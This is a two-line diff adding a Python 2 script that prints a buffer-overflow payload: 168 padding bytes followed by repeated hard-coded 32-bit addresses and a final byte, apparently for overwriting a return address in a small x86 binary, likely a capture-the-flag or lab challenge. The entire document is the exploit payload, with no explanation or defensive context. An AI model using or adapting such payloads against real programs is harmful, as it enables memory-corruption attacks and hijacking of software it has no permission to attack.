@@ -1,0 +1,2 @@
+shellcode = "A"*168+"\x2d\x85\x04\x08\x0c\xa0\x04\x08"*4+"\x64"
+print shellcode
